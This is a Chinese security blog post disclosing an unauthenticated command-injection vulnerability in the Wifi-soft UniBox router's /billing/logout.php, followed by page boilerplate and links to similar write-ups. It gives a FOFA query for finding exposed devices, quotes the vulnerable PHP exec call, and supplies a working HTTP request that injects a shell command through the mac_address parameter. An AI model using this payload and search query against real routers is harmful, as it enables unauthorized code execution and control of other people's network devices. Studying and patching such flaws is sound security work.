---
title: "Unibox路由器 /billing/logout.php 命令执行漏洞"
source: https://mrxn.net/jswz/unibox-billing-logout-mac_address-rce.html
asset_dir: assets/unibox路由器-billinglogout.php-命令执行漏洞
---

# Unibox路由器 /billing/logout.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/29 08:20
* 1459浏览
* [0评论](#comment)
* 20分钟阅读

深入探索

路由器

服务器

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Wifi-soft UniBox controller 路由器产品中存在一个致命漏洞，`/billing/logout.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。

网络设备

# 影响版本

# fofa语法

> `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`

# 漏洞分析

直接看 `/billing/logout.php` 的业务实现造成漏洞的关键部分如下

```
<?php
#==========================================================================================================================# 
# WIFI-SOFT SOLUTIONS PRIVATE LIMITED CONFIDENTIAL
# 
# Copyrights (C) 2005-2011 Wifi-soft Solutions Pvt. Ltd. All Rights Reserved.
# 
# NOTICE:  All information contained herein is, and remains the property of Wifi-soft Solutions Pvt. Ltd. and its suppliers,
# if any.  The intellectual and technical concepts contained herein are proprietary to Wifi-soft Solutions Pvt. Ltd.
# and its suppliers and may be covered by U.S. and international Patents, patents in process, and are protected by 
# trade secret or copyright law.Dissemination of this information or reproduction of this material is strictly forbidden 
# unless prior written permission is obtained from Wifi-soft Solutions Pvt. Ltd.
#
# THIS CODE AND INFORMATION ARE PROVIDED "AS IS" WITHOUT WARRANTY OF ANY 
# KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
# PARTICULAR PURPOSE.
#
# Project: UniBox 
#=========================================================================================================================#
      $logout_user = $_REQUEST['logout_user'];
      $mac_address = $_REQUEST['mac_address'];  

      $status =0 ;  
      if( $logout_user == 1 ){
       exec("sudo /usr/sbin/chilli_ipc logout $mac_address");  
       $status = 1;
    }  
?>
```

深入探索

网络安全培训

网络安全会议

Docker加速服务

很明显的当 `logout_user=` 时，直接将 `mac_address` 拼接进 `exec` 中执行，无任何过滤和校验，造成[命令执行](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

> 支持cookie获取参数，注意检测点，别漏
>
> 漏洞预警服务

```
GET /billing/logout.php?logout_user=1&mac_address=;id>11.txt HTTP/1.1
Host: unibox.mrxn.net
```

访问命令执行结果文件 `/billing/11.txt`

[![Unibox路由器 /billing/logout.php 命令执行漏洞](images/img-001-eb5d52a50de6.webp)](https://image.mrxn.net/60b4f907ff5143ab9e9755860efa383d.webp)

成功获得 `id` 命令执行的结果

网络安全

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Unibox路由器 /billing/logout.php 命令执行漏洞](https://mrxn.net/jswz/unibox-billing-logout-mac_address-rce.html)  
文章链接：<https://mrxn.net/jswz/unibox-billing-logout-mac_address-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-billing-logout-mac\_address-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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